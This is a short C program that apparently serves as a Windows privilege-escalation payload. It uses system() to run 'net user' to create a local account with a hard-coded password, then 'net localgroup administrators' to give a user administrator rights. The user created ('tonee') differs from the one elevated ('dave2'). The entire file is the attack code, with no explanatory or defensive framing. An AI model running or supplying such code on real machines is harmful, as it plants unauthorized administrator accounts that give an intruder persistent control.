#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user tonee tonee123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
